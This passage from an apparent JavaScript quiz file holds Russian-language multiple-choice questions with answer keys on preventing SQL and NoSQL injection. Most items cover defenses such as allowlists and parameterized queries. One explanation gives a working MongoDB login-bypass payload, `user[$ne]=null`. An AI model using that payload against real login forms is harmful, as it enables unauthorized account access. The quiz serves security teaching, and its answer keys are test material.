            "В NoSQL базах данных полностью отсутствуют понятия таблиц и коллекций, поэтому невозможно использовать деструктивные команды типа `DROP`",
            "Разницы практически нет, так как все современные базы данных внутри преобразуют запросы в стандартный SQL, поэтому вектора атак идентичны",
            "NoSQL инъекции возможны только если база данных (например, MongoDB) запущена с опасным флагом `--no-auth` и доступна из интернета",
            "В NoSQL синтаксисе нельзя использовать комментарии (типа `--` или `#`), что делает невозможным отбрасывание остальной части запроса"
        ],
        correctAnswerIndex: 0,
        explanation: "В MongoDB популярна атака через операторы запроса: `user[$ne]=null` может залогинить вас как первого пользователя без пароля.",
        link: {
            label: "HackTricks: NoSQL Injection",
            url: "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
        }
    },
    {
        question: "Что делать, если приходится использовать динамический SQL (конкатенацию) для имен таблиц?",
        answers: [
            "Использовать строгий белый список (Allowlist) разрешенных имен таблиц. Если ввод не совпадает с white list — отклонять запрос",
            "Использовать стандартную функцию `addslashes()` или `mysql_real_escape_string()` для экранирования имени таблицы перед вставкой",
            "Обернуть имя таблицы в обратные кавычки (backticks) `` ` `` и надеяться, что драйвер базы данных сам отфильтрует все опасные символы",
            "Применять сложное регулярное выражение, которое удаляет все символы кроме латинских букв и цифр, но позволяет любую длину строки",
            "Преобразовать имя таблицы в формат Base64, чтобы гарантированно исключить спецсимволы, и декодировать его встроенной функцией БД",
            "Использовать `Prepared Statements` с плейсхолдером `?` для имени таблицы, так как большинство современных драйверов это уже поддерживают",
            "Генерировать случайное имя таблицы для каждого запроса 'на лету', чтобы атакующий не мог угадать реальную структуру базы данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Валидация по списку — единственная надежная защита там, где нельзя использовать Bind Variable.",
        link: {
            label: "OWASP: Query Parameterization",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-3-escaped-input"
        }
    },
    {
        question: "Какая стратегия защиты от SQLi является наиболее эффективной (Defense in Depth)?",
        answers: [
            "Параметризация запросов (Prepared Statements) + Валидация ввода (Input Validation) + Принцип наименьших привилегий (Least Privilege) для пользователя БД",
            "Использование исключительно Web Application Firewall (WAF) с регулярно обновляемыми наборами сигнатур для блокировки атак",
            "Применение строгих регулярных выражений для всех входных данных, запрещающих использование кавычек и служебных символов SQL",
            "Полное шифрование всей базы данных на уровне файловой системы, чтобы злоумышленник не мог прочитать данные даже в случае инъекции",
            "Миграция на NoSQL базы данных, так как они архитектурно не подвержены инъекциям и являются более безопасным решением",
            "Смена стандартных портов базы данных и скрытие административной панели за VPN для уменьшения поверхности атаки",
            "Отключение сообщений об ошибках в браузере (suppress errors) и использование обфускации исходного кода приложения"
        ],
        correctAnswerIndex: 0,
        explanation: "Если один слой защиты (код) пробит, права доступа (БД) не должны позволить атакующему удалить таблицы или прочитать `/etc/passwd`.",
        link: {
            label: "OWASP: Defense in Depth",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что делать с устаревшим кодом, в котором невозможно быстро внедрить PDO/Prepared Statements?",
        answers: [
            "Использовать временные 'заплатки' (Virtual Patching) на WAF, строго экранировать весь ввод (escape functions) и планомерно рефакторить код",
            "Полностью переписать приложение на новый современный фреймворк с нуля за один спринт, игнорируя текущие бизнес-задачи",
            "Отключить базу данных от сети и перевести все критичные компоненты приложения в режим 'только чтение' до исправления",
            "Игнорировать уязвимости, если код работает во внутренней сети, так как внешний периметр защищен корпоративным файрволом",
            "Применить автоматическое шифрование всех входящих HTTP запросов на уровне шлюза, чтобы SQL-инъекции стали невозможны",
            "Уволить команду разработчиков, допустивших уязвимости, и нанять аутсорсинговую компанию для поддержки легаси кода",
            "Удалить базу данных и восстановить её из резервной копии только после того, как все уязвимости будут теоретически закрыты"
        ],
        correctAnswerIndex: 0,
        explanation: "Риск должен быть принят бизнесом и минимизирован (WAF, мониторинг), пока идет рефакторинг.",
        link: {
            label: "OWASP: Virtual Patching",
            url: "https://owasp.org/www-community/Virtual_Patching_Best_Practices"
        }
    },
];
